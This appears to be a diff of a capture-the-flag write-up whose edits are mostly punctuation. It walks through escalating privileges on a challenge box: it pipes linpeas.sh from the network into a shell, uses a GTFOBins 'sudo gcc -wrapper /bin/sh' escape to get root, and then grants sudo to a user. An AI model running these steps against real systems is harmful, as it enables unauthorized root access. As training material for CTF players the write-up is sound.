@@ -42,14 +42,14 @@ Nmap done: 1 IP address (1 host up) scanned in 12.95 seconds
  
 ```
 
-Switching ports
+Switching ports.
 
 ```bash
 ssh -p 2222 Pentester@<ip>
 ```
 
 
-Challenge requires privilege escalation so let's go script kiddie and fetch a tool to search for that "privesc" as it's call in "the biz":
+Challenge requires privilege escalation so let's go script kiddie and fetch a tool to search for that "privesc" as it's call in "the biz".
 
 ```bash
 curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
@@ -147,27 +147,27 @@ Last login: Thu Nov 28 22:51:34 2024 from 127.0.0.1
 
 ### Step 2: Priv Esc
 
-See what groups Joan's in
+See what groups Joan's in.
 
 ```bash
 groups
 Joan sudo
 ```
 
-Good, good, now let's add our pentester account to sudoers
+Good, good, now let's add our pentester account to sudoers.
 
 ```bash
 sudo usermod -aG sudo Pentester
 Sorry, user Joan is not allowed to execute '/usr/sbin/usermod -aG sudo Pentester' as root on dad5f987a15f."
 ```
 
-Blerg! Rubbing the brow here as I was heading for a PB for unfinished challenges in this event. Thankfully team-work makes the dream work and I looked to the east for a teammate wizard saviour:
+Blerg! Rubbing the brow here as I was heading for a PB for unfinished challenges in this event. Thankfully team-work makes the dream work and I looked to the east for a teammate wizard saviour.
 
 ![image](./gandalf-white.gif)
 
-Thanks wizard teammate 🧙 10 seconds, one command, and a URL later: 
+Thanks wizard teammate 🧙 10 seconds, one command, and a URL later. 
 
-The command: 
+The command.
 
 ```bash
 sudo -l
@@ -176,7 +176,7 @@ sudo -l
 
 The URL: https://gtfobins.github.io/gtfobins/gcc#sudo
 
-Doopdeedoop, let's try that GTOFbin command now
+Doopdeedoop, let's try that GTOFbin command now.
 
 ```bash
 sudo gcc -wrapper /bin/sh,-s .
@@ -187,7 +187,7 @@ root
 
 😍 
 
-Now we can give our Pentester account sudo powers
+Now we can give our Pentester account sudo powers.
 
 ```bash
 sudo usermod -aG sudo Pentester
@@ -196,7 +196,7 @@ exit
 exit
 ```
 
-There we logged out of root, Joan, and Pentester, then sshed back in to the latter and to apply the new group memberships. Check those
+There we logged out of root, Joan, and Pentester, then sshed back in to the latter and to apply the new group memberships. Check those.
 
 ```bash
 ssh -p 2222 Pentester@<ip>
@@ -228,7 +228,7 @@ Privilege escalated.
 
 ### Step 3: Flag Retrieval
 
-Now the flag's gotta be here somewhere, normally I use `find` (looking for flag.txt) or `grep` (looking for string FLAG within a file) on the entire file system. Trying find first:
+Now the flag's gotta be here somewhere, normally I use `find` (looking for flag.txt) or `grep` (looking for string FLAG within a file) on the entire file system. Trying find first 
 
 ```bash
 # find / -name flag.txt -type f
